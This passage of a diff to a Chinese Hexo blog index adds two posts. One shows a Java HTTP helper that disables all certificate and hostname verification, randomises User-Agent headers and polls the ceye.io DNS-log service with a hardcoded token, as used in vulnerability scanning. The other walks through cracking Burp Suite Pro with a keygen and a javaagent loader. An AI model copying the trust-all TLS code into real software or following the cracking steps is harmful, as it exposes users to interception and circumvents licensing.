class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;User-Agent:Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_8;en-us)AppleWebKit/534.50(KHTML,likeGecko)Version/5.1Safari/534.50&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/5.0(Windows;U;WindowsNT6.1;en-us)AppleWebKit/534.50(KHTML,likeGecko)Version/5.1Safari/534.50&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Opera/9.80(Macintosh;IntelMacOSX10.6.8;U;en)Presto/2.8.131Version/11.11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Maxthon2.0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;TencentTraveler4.0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;TheWorld)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;SE2.XMetaSr1.0;SE2.XMetaSr1.0;.NETCLR2.0.50727;SE2.XMetaSr1.0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;360SE)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;AvantBrowser)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent:Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1)&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//随机UA头</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getRandomUserAgent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">return</span> random.nextInt(agent.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//忽略证书安全性，格式性内容</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        TrustManager[] trustManager = <span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">X509TrustManager</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] x509Certificates, String s)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] x509Certificates, String s)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">X509Certificate</span>[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;&#125;;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sslContext.init(<span class="literal">null</span>,trustManager,<span class="keyword">new</span> <span class="title class_">java</span>.security.SecureRandom());</span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">HostnameVerifier</span> <span class="variable">DO_NOT_VERIFY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HostnameVerifier</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname, SSLSession session)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Getbody:响应报文是以键值对的形式返回的如code 200，所以返回值类型选择Map</span></span><br><span class="line">    <span class="comment">//requestproperty:自定义请求头，用户自己添加请求头的内容</span></span><br><span class="line">    <span class="comment">//uri:代表请求的地址</span></span><br><span class="line">    <span class="comment">//http与https的区别在于三次握手之后还要进行tls连接，连接完成后才能对目标发送请求</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">getBody</span><span class="params">(Map&lt;String,String&gt; requestproperty,String uri,<span class="type">int</span> timeout)</span>&#123;</span><br><span class="line">        <span class="comment">//判断是否带协议，如果没有则进行连接判断应该使用http还是https</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isHTTPS</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (uri.indexOf(<span class="string">&quot;https&quot;</span>)==-<span class="number">1</span>&amp;&amp;uri.indexOf(<span class="string">&quot;http&quot;</span>)==-<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">HttpsURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//添加https请求头</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://&quot;</span> + uri);</span><br><span class="line">                connection = (HttpsURLConnection) url.openConnection();</span><br><span class="line">                connection.setHostnameVerifier(DO_NOT_VERIFY);  <span class="comment">//忽略证书安全性</span></span><br><span class="line">                connection.setConnectTimeout(timeout); <span class="comment">//连接超时时间</span></span><br><span class="line">                connection.setReadTimeout(timeout);    <span class="comment">//读取超时时间</span></span><br><span class="line">                connection.connect();   <span class="comment">//进行连接</span></span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                <span class="comment">//如果网站使用http，而我们默认使用了https那么就会报错，走catch流程</span></span><br><span class="line">                isHTTPS = <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span> (isHTTPS)</span><br><span class="line">                    uri = <span class="string">&quot;https://&quot;</span>+uri;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    uri = <span class="string">&quot;http://&quot;</span>+uri;</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">null</span> != connection)</span><br><span class="line">                    connection.disconnect();    <span class="comment">//关流</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//System.out.println(uri);</span></span><br><span class="line">        <span class="comment">//到这里我们拿到的网址肯定是带协议的了，开始进行网站请求</span></span><br><span class="line">        Map&lt;String,Object&gt; responseMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();   <span class="comment">//存放响应值的键值对</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建连接对象</span></span><br><span class="line">        HttpURLConnection connection;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(uri);</span><br><span class="line">            <span class="keyword">if</span> (url.getProtocol().toLowerCase().equals(<span class="string">&quot;https&quot;</span>))&#123;</span><br><span class="line">                <span class="type">HttpsURLConnection</span> <span class="variable">https</span> <span class="operator">=</span> (HttpsURLConnection) url.openConnection();</span><br><span class="line">                https.setHostnameVerifier(DO_NOT_VERIFY);</span><br><span class="line">                connection = https;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//随机UA头</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> == requestproperty.get(<span class="string">&quot;User-Agent&quot;</span>))&#123;</span><br><span class="line">                connection.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>,agent[getRandomUserAgent()]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果用户没有自定义Content-Type，则使用默认的</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> == requestproperty.get(<span class="string">&quot;Content-Type&quot;</span>))&#123;</span><br><span class="line">                connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencodeed;charset=UTF-8&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//循环遍历用户传入的自定义请求头，将内容添加到请求头中</span></span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;String,String&gt; entry:requestproperty.entrySet())&#123;</span><br><span class="line">                connection.setRequestProperty(entry.getKey(),entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            connection.setConnectTimeout(timeout);  <span class="comment">//连接超时时间</span></span><br><span class="line">            connection.setReadTimeout(timeout);     <span class="comment">//读取超时时间</span></span><br><span class="line">            connection.setDoInput(<span class="literal">true</span>);    <span class="comment">//设置为true表示应用程序打算从URL连接读取数据</span></span><br><span class="line">            connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>); <span class="comment">//请求方式</span></span><br><span class="line">            connection.connect();   <span class="comment">//连接</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取响应结果</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> connection.getResponseCode() + <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">//获取响应头</span></span><br><span class="line">            Map&lt;String, List&lt;String&gt;&gt; responseProperty = connection.getHeaderFields();</span><br><span class="line">            <span class="comment">//获取响应内容存放到result中</span></span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;200&quot;</span>.equals(code))&#123;</span><br><span class="line">                isr = <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(connection.getInputStream(),<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                isr = <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(connection.getErrorStream(),<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> != isr)&#123;</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">                <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">while</span>((line = br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    result.append(line+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                br.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//关流</span></span><br><span class="line">            isr.close();</span><br><span class="line">            connection.disconnect();</span><br><span class="line">            <span class="comment">//将响应结果添加到Map中作为返回输出结果</span></span><br><span class="line">            responseMap.put(<span class="string">&quot;code&quot;</span>,code);</span><br><span class="line">            responseMap.put(<span class="string">&quot;responseProperty&quot;</span>,responseProperty);</span><br><span class="line">            responseMap.put(<span class="string">&quot;content&quot;</span>,result.toString());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> responseMap;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//对接ceye平台</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="string">&quot;9f752dfbce717e395f2b8b8851fa5da7&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title function_">RefreshCeye</span><span class="params">(String filter)</span>&#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//ceye API调用接口：http://api.ceye.io/v1/records?token=&#123;token&#125;&amp;type=&#123;dns|http&#125;&amp;filter=&#123;filter&#125;</span></span><br><span class="line">        Map&lt;String, Object&gt; bodyParam = getBodyParam(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="string">&quot;http://api.ceye.io/v1/records&quot;</span>, <span class="string">&quot;token=&quot;</span> + token + <span class="string">&quot;&amp;type=dns&amp;filter=&quot;</span> + filter, <span class="number">2000</span>);</span><br><span class="line">        <span class="comment">//返回响应结果，是JSON格式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> (String) bodyParam.get(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">        <span class="comment">//FastJSON解开JSON格式取出data值</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(content);</span><br><span class="line">        <span class="type">List</span> <span class="variable">data</span> <span class="operator">=</span> (List) jsonObject.get(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">        <span class="comment">//data有值则调用成功</span></span><br><span class="line">        <span class="keyword">if</span> (data.size() &gt; <span class="number">0</span>)</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/04/17/Java-Request/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Mac  Burp_Suite安装与破解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/03/29/Mac%20%20Burp_Suite%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3/">Mac Burp_Suite安装与破解</a>
+    </h1>
+  
+
+        
+        <a href="/2023/03/29/Mac%20%20Burp_Suite%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3/" class="archive-article-date">
+  	<time datetime="2023-03-29T02:16:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Mac-Burp-Suite安装与破解"><a href="#Mac-Burp-Suite安装与破解" class="headerlink" title="Mac  Burp_Suite安装与破解"></a>Mac  Burp_Suite安装与破解</h3><ol>
+<li><p>下载burp(新版目录结构有变化)：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/releases/professional-community-2021-7-1">https://portswigger.net/burp/releases/professional-community-2021-7-1</a></p>
+</li>
+<li><p>下载破解工具（注册机）：<a target="_blank" rel="noopener" href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></p>
+</li>
+<li><p>在应用程序中右键burp选择显示包内容，进入程序目录</p>
+</li>
+<li><p>将 <code>burp-keygen-scz.jar</code> 和 <code>burp-loader-x-Ai.jar</code> 放入到 burp&#x2F;Contents&#x2F;java&#x2F;app下</p>
+</li>
+<li><p>编辑 <code>vmoptions.txt</code> 文件添加：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-Dfile.encoding=utf-8</span><br><span class="line">-noverify</span><br><span class="line">-javaagent:burp-loader-x-Ai.jar</span><br><span class="line">-Xmx2048m</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打开终端输入：带着加载器启动burp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Burp\ Suite\ Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java -Dfile.encoding=utf-8 -noverify -javaagent:/Applications/Burp\ Suite\ Professional.app/Contents/Resources/app/burp-loader-x-Ai.jar -Xmx2048m --illegal-access=permit -jar /Applications/Burp\ Suite\ Professional.app/Contents/Resources/app/burpsuite_pro.jar</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>新建终端输入：弹出提升输入 key，启动注册机走一遍注册流程（注意复制到burp中选手动激活而不是下一步）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Burp\ Suite\ Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java -jar /Applications/Burp\ Suite\ Professional.app/Contents/Resources/app/burp-keygen-scz.jar</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>汉化：下载汉化补丁<code>BurpSuiteCn.jar</code> 放入到 burp&#x2F;Contents&#x2F;java&#x2F;app下</p>
+</li>
+<li><p>在<code>vmoptions.txt</code> 文件中添加：-javaagent:BurpSuiteCn.jar。完成汉化</p>
+</li>
+<li><p>安装证书使得可以拦截https：开启代理拦截访问网址<a target="_blank" rel="noopener" href="http://burp下载证书/">http://burp下载证书</a></p>
+</li>
+<li><p>在chrome设置中找到证书管理，跳转到钥匙串访问</p>
+</li>
+<li><p>钥匙串访问中的–登陆–证书下拖入下载的证书</p>
+</li>
+<li><p>此时证书是不被信任的，右键导入的证书–显示简介–将信任改为始终信任</p>
+</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/03/29/Mac%20%20Burp_Suite%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Hexo-Github静态博客搭建" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -598,201 +941,6 @@
 
 
   
-    <article id="post-JAVA_day07" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/03/28/JAVA_day07/">JAVA学习_day07</a>
-    </h1>
-  
-
-        
-        <a href="/2023/03/28/JAVA_day07/" class="archive-article-date">
-  	<time datetime="2023-03-28T05:46:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="异常机制"><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h3>
-        
-          <a class="article-more-a" href="/2023/03/28/JAVA_day07/#more">展开全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/03/28/JAVA_day07/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-JAVA_day06" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/03/28/JAVA_day06/">JAVA学习_day06</a>
-    </h1>
-  
-
-        
-        <a href="/2023/03/28/JAVA_day06/" class="archive-article-date">
-  	<time datetime="2023-03-28T05:45:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3>
-        
-          <a class="article-more-a" href="/2023/03/28/JAVA_day06/#more">展开全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/03/28/JAVA_day06/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-JAVA_day05" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/03/28/JAVA_day05/">JAVA学习_day05</a>
-    </h1>
-  
-
-        
-        <a href="/2023/03/28/JAVA_day05/" class="archive-article-date">
-  	<time datetime="2023-03-28T05:44:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3>
-        
-          <a class="article-more-a" href="/2023/03/28/JAVA_day05/#more">展开全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/03/28/JAVA_day05/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -949,7 +1097,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">希望能得到大家的喜欢，谢谢！</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">我最宝贵的，会是那些不切实际的幻想吗？</div>
   	  	
     	</section>
     
